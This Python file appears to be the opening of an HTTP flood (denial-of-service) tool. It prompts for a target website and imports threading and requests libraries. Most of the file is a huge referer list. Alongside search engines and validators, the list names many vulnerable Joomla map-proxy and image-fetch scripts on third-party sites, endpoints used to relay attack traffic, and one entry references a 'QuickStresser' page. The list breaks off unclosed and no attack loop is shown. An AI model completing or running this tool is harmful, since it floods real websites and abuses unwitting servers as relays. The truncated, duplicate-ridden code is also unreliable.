import os
import requests
import threading
import random

if os.name == 'nt':
    os.system("cls")
else:
    os.system("clear")


url = input("Link Website :  ").strip()


count = 0
headers = []
referer = [
    "https://google.it/",
    "https://facebook.com/",
    "https://duckduckgo.com/",
    "https://google.com/",
    "https://youtube.com",
    "https://yandex.com",
    "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
     ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
     "/sharer.php?u=",
     ",https://drive.google.com/viewerng/viewer?url=",
     ",https://www.google.com/translate?u=",
     "https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/l.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=",
     "https://www.facebook.com/sharer/sharer.php?u=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://www.bing.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://play.google.com/store/search?q=",
     "http://www.google.com/?q=",
     "http://regex.info/exif.cgi?url=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?uri=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile=http://www.w3.org&xslfile=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceurl=",
     "http://www.translate.ru/url/translation.aspx?direction=er&sourceurl=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
     "http://browsershots.org;POST;browsershots.org.txt",
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
     "http://web-sniffer.net/?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
     "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=?url=",
     "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.netacad.lviv.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.veloclub.ru/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.virtualsoft.pl/plugins/content/plugin_googlemap3_proxy.php?url=",
     "http://gminazdzieszowice.pl/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://fets3.freetranslation.com/?Language=English%2FSpanish&Sequence=core&url=",
     "http://www.fare-furore.com/com-line/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.rotisseriesalaberry.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.lbajoinery.com.au/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seebybike.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.copiflash.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://suttoncenterstore.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://coastalcenter.net/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://whitehousesurgery.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vertexi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.owl.cat/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.sizzlebistro.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://thebluepine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://donellis.ie/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://validator.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
     "http://validator.w3.org/nu/?doc=",
     "http://check-host.net/check-http?host=",
     "http://www.netvibes.com/subscribe.php?url=",
     "http://www-test.cisel.ch/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sistem5.net/ww/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.fmradiom.hu/palosvorosmart/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.iguassusoft.com/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://lab.univ-batna.dz/lea/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.computerpoint3.it/cp3/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://hotel-veles.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://klaassienatuinstra.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.google.com/ig/add?feedurl=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://qa-dev.w3.org/unicorn/check?ucn_task=conformance&ucn_uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?uri=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile= http://www.w3.org&xslfile=",
     "http://www.w3.org/services/tidy?docAddr=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://validator.w3.org/p3p/20020128/policy.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
     "http://www.viewdns.info/ismysitedown/?domain=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceurl=",
     "http://www.translate.ru/url/translation.aspx?direction=er&sourceurl=",
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "https://www.google.com/search?q=",
     "https://check-host.net/",
     "https://www.facebook.com/",
     "https://www.youtube.com/",
     "https://www.fbi.com/",
     "https://www.bing.com/search?q=",
     "https://r.search.yahoo.com/",
     "https://www.cia.gov/index.html",
     "http://netsec-reborn.onion/QuickStresser-virus?id=",
     "https://vk.com/profile.php?redirect=",
     "https://www.usatoday.com/search/results?q=",
     "https://help.baidu.com/searchResult?keywords=",
     "https://steamcommunity.com/market/search?q=",
     "https://www.ted.com/search?q=",
     "https://play.google.com/store/search?q=",
     "https://drive.google.com/viewerng/viewer?url=",
     "http://www.google.com/translate?u=",
     "https://developers.google.com/speed/pagespeed/insights/?url=",
     "http://help.baidu.com/searchResult?keywords=",
     "http://www.bing.com/search?q=",
     "https://add.my.yahoo.com/rss?url=",
     "https://play.google.com/store/search?q=",
     "http://www.google.com/?q=",
     "http://regex.info/exif.cgi?url=",
     "http://anonymouse.org/cgi-bin/anon-www.cgi/",
     "http://www.google.com/translate?u=",
     "http://translate.google.com/translate?u=",
     "http://validator.w3.org/feed/check.cgi?url=",
     "http://www.w3.org/2001/03/webdata/xsv?style=xsl&docAddrs=",
     "http://validator.w3.org/check?uri=",
     "http://jigsaw.w3.org/css-validator/validator?uri=",
     "http://validator.w3.org/checklink?uri=",
     "http://www.w3.org/RDF/Validator/ARPServlet?uri=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xslfile=http%3A%2F%2Fwww.w3.org%2F2002%2F08%2Fextract-semantic.xsl&xmlfile=",
     "http://www.w3.org/2005/08/online_xslt/xslt?xmlfile= ",
     "http://www.w3.org&xslfile=",
     "http://validator.w3.org/mobile/check?docAddr=",
     "http://validator.w3.org/p3p/20020128/p3p.pl?uri=",
     "http://online.htmlvalidator.com/php/onlinevallite.php?url=",
     "http://feedvalidator.org/check.cgi?url=",
     "http://gmodules.com/ig/creator?url=",
     "http://www.google.com/ig/adde?moduleurl=",
     "http://www.cynthiasays.com/mynewtester/cynthia.exe?rptmode=-1&url1=",
     "http://www.watchmouse.com/en/checkit.php?c=jpcheckit&vurl=",
     "http://host-tracker.com/check_page/?furl=",
     "http://panel.stopthehacker.com/services/validate-payflow?email=1@1.com&callback=a&target=",
     "http://www.onlinewebcheck.com/check.php?url=",
     "http://www.online-translator.com/url/translation.aspx?direction=er&sourceurl=",
     "http://www.translate.ru/url/translation.aspx?direction=er&sourceurl=",
     "http://about42.nl/www/showheaders.php;POST;about42.nl.txt",
     "http://browsershots.org;POST;browsershots.org.txt",
     "http://streamitwebseries.twww.tv/proxy.php?url=",
     "http://www.comicgeekspeak.com/proxy.php?url=",
     "http://67.20.105.143/bitess/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bemaxjavea.com/javea-rentals-alquileres/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://centrobrico.net/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://conodeluz.org/magnanet/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://greenappledentaldt.com/home/templates/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://html.strost.ch/dgi/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://kobbeleia.net/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://krd-medway.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://old.ucpb.org/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.abs-silos.de/en/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.admksg.ru/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.autoklyszewski.pl/autoklyszewski/mambots/content/plugin_googlemap2_proxy.php?url=",
     "http://www.build.or.at/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.caiverbano.it/sito/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.cbcstittsville.com/home/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.ciutatdeivissa.org/portal/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.contrau.com.br/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dierenhotelspaubeek.nl/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/DU/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gaston-schul.nl/FR/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gillinghamgurdwara.co.uk/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.gilmeuble.ch/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.hortonmccormick.com/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kanzlei-berendes.de/homepage/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.kita-spielhaus.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.lacasaencarilo.com.ar/sitio/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.losaromos-spa.com.ar/~losaromo/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.nickclift.co.uk/web/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.palagini.it/palagini/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.parsifaldisco.com/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.podosys.com/csm/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.renault-windisch.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.riegler-dorner.at/joomla/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.seevilla-dr-sturm.at/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sounders.es/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.suelcasa.com/suelcasa/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tcl.lu/Site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tijssen-staal.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.triatarim.com.tr/TriaEn/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tus-haltern.de/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vm-esslingen.de/cms/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.zahnarzt-buhl.de/praxis/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.sultanpalace.nl/site/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bergenpol.com/cms//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arantzabelaikastola.com/webgunea//plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fare-furore.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dog-ryusen.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.spvgg-roedersheim.de/web/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.dahlnet.no/v2/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://ping-admin.ru/index.sema;POST;ping-admin.ru.txt",
     "http://web-sniffer.net/?url=",
     "http://sova-tour.com.ua/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://scu-oldesloe.de/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://translate.yandex.ru/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.ua/translate?srv=yasearch&lang=ru-uk&url=",
     "http://translate.yandex.net/tr-url/ru-uk.uk/",
     "http://www.bongert.lu/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://laresmadrid.org/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://doleorganic.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://crawfordlivestock.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.aculaval.com/joomla/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://grandsultansaloon.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.d1010449.cp.blacknight.com/cpr.ie/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.architettaresas.it/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://basketgbkoekelare.be/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.arbitresmultisports.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://mobilrecord.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.dbaa.co.za/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://waggum-bevenrode.sg-bevenrode.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bwsnt1.pdsda.net/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://www.astecdisseny.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.fillmorefairways.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.bus-reichert.eu/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.maxxxi.ru/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://potholepeople.co.nz/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hammondgolf.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.footgoal33.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://bbtoma.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.tajmahalrestaurant.co.za/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.yerbabuenacuisine.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.rinner-alm.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://stockbridgetownhall.co.uk/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://mentzerrepairs.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.tilmouthwell.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.homevisionsinc.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://toddlers.nalanda.edu.in/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://cultura-city.rv.ua/plugins/system/plugin_googlemap3_proxy.php?url=",
     "http://secret.leylines.info/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://bike-electric.co.uk/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://www.centroaquaria.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://agenzia-anna.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.gretnadrug.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.crestwoodpediatric.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.oceans-wien.com/plugins/system/plugin_googlemap2_proxy.php?url=;BYPASS",
     "http://lavori.joomlaskin.it/italyhotels/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://santaclaradelmar.com/hoteles/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://www.authentic-luxe-locations.com/wp-content/plugins/js-multihotel/includes/show_image.php?w=1&h=1&file=",
     "http://www.keenecinemas.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.hotelmonyoli.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://prosperitydrug.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://policlinicamonteabraao.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.vetreriafasanese.com/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.benawifi.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://www.valleyview.sa.edu.au/plugins/system/plugin_googlemap2_proxy.php?url=",
     "http://www.racersedgekarting.com/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.minterne.co.uk/mjs/plugins/content/plugin_googlemap2_proxy.php?url=",
     "http://www.villamagnoliarelais.com/plugins/system/plugin_googlemap2/plugin_googlemap2_proxy.php?url=",
     "http://worldwide-trips.com/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
     "http://systemnet.com.ua/plugins/system/plugin_googlemap3/plugin_googlemap3_proxy.php?url=",
